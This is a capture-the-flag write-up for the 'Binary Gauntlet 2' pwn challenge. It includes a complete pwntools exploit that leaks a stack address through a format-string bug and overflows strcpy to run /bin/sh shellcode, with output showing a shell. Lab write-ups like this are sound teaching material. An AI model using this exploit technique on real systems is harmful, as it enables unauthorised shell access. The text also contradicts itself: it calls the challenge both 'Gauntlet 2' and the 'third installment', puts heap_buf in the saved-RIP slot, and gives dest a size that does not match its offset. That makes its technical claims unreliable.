# CyLab — Binary Gauntlet 2

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [pwn.college](https://pwn.college/)  
* **Category:** Binary Exploitation (Pwn / Format String Leak & Ret2Shellcode)  
* **Difficulty:** Easy (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 64-bit ELF (`gauntlet`) — Non-PIE, NX Disabled (Stack RWX)  

---

## TL;DR

The third installment of the Binary Gauntlet series introduces Address Space Layout Randomization (ASLR) without an explicit helper leak. While NX remains disabled (stack is RWX), the binary removes the explicit `printf("%p\n", dest)` call from Gauntlet 1. Instead, it reads input from `stdin` into a heap buffer and calls `printf(heap_buf)` directly before executing `strcpy(dest, heap_buf)`. We exploit this format string vulnerability to leak the saved frame pointer (`saved RBP`) using `%22$p`. From this leaked address, we calculate the deterministic stack frame offset of `dest` (`saved_rbp - 0x70`). Overwriting `saved RIP` with this calculated address redirects control flow into our shellcode.

---

## Recon

We inspect the binary's properties and security mitigations using `file` and `checksec`:

```bash
$ file gauntlet
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped

$ checksec gauntlet
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled (Stack executable)
    PIE:      No PIE (0x400000)
```

Key observations:
* **File Type:** ELF 64-bit LSB (x86-64), dynamically linked, not stripped.
* **Canary:** `No canary found` — Stack frames can be overflowed without canary validation.
* **NX:** `NX disabled` — Shellcode execution on the stack is fully supported.
* **PIE:** `No PIE (0x400000)` — Executable code addresses are static.
* **Vulnerabilities:** Combines a format string vulnerability in `printf()` with a stack buffer overflow in `strcpy()`.

---

## Static Analysis & Vulnerability

### 1. Decompilation in IDA Pro

Decompiling `main()`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[104]; // [rsp+0h] [rbp-70h] BYREF
  char *heap_buf; // [rsp+78h] [rbp+8h]

  heap_buf = (char *)malloc(1000);

  // Vulnerability 1: Format String
  fgets(heap_buf, 1000, stdin);
  printf(heap_buf);
  fflush(stdout);

  // Vulnerability 2: Buffer Overflow
  fgets(heap_buf, 1000, stdin);
  strcpy(dest, heap_buf);
  return 0;
}
```

### 2. Disassembly & Vulnerability Root Cause

1. **Format String Memory Leak:** `printf(heap_buf)` takes user input directly as a format string. Inspecting the stack frame in GDB identifies that argument index `22` (`%22$p`) contains the caller's saved frame pointer (`saved RBP`).
2. **Buffer Overflow in `strcpy()`:** The second `fgets()` reads up to 1,000 bytes, which `strcpy()` copies into `dest` at `[rbp-0x70]` (104 bytes in size).

### 3. Stack Memory Layout & Offset Computation

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [rbp - 0x70] (Start of dest: Target Address)
  |                                   |
  |     Shellcode (offset 0)          |  <- execve("/bin/sh")
  |     Padding (A * ...)             |
  |                                   |
  +-----------------------------------+  <- [rbp] (Saved RBP: Leaked via %22$p)
  |     Saved RBP (8 bytes)           |
  +-----------------------------------+  <- [rbp + 0x08] (Saved RIP)
  |     Return Address (Saved RIP)    |  <- Overwritten with (Saved RBP - 0x70)
  +-----------------------------------+
  Higher Memory Addresses
```

- Target address calculation:
  $$\text{Address}_{\text{dest}} = \text{Saved RBP} - 0x70$$
- Distance from `dest` to `saved RIP`:
  $$\text{Offset} = 0x70 + 0x08 = 0x78 = 120 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

1. **Phase 1 (Format String Leak):** Send `%22$p\n`. Parse the returned hexadecimal address as `saved_rbp`.
2. **Compute Target Address:** Calculate `stack_dest = saved_rbp - 0x70`.
3. **Phase 2 (Ret2Shellcode Overflow):**
   * Place 64-bit shellcode at `offset 0`.
   * Pad with `b"A"` characters up to 120 bytes.
   * Append `p64(stack_dest)`.
4. When `main()` returns, it pops our calculated stack address into `RIP` and executes `/bin/sh`.

---

## Exploit

We implement the complete two-phase exploit with `pwntools`:

```python
#!/usr/bin/env python3
"""
CyLab — Binary Gauntlet 2
Exploit: Format string stack leak + Ret2Shellcode overflow
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

EXE = "./gauntlet"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 143)

def main():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # 1. Leak saved RBP via format string
    p.sendline(b"%22$p")
    leak_line = p.recvline().strip()
    saved_rbp = int(leak_line, 16)
    dest_addr = saved_rbp - 0x70

    log.success(f"Leaked Saved RBP: {hex(saved_rbp)}")
    log.success(f"Calculated Dest:  {hex(dest_addr)}")

    # 2. Craft Ret2Shellcode payload
    shellcode = asm(shellcraft.sh())
    payload = shellcode.ljust(120, b"A") + p64(dest_addr)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the exploit extracts the frame pointer, jumps into the stack buffer, and yields an interactive shell:

```text
[+] Leaked Saved RBP: 0x7ffcf3408660
[+] Calculated Dest:  0x7ffcf34085f0
[*] Switching to interactive mode
$ cat flag.txt
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Raw 32-character hexadecimal flag redacted per disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Stack Address Recovery via Frame Pointers**: When direct stack pointers are not exposed, leaking `saved RBP` or argument registers via format strings provides the exact base from which local buffer offsets can be derived.
2. **Sequential Vulnerability Chaining**: Combining an information disclosure vulnerability (Format String) with a memory corruption vulnerability (Buffer Overflow) reliably defeats ASLR.
3. **Execution Permissions**: As long as the stack retains executable permissions (NX off), attackers do not need to construct complex ROP chains—simple shellcode injection suffices once addresses are known.
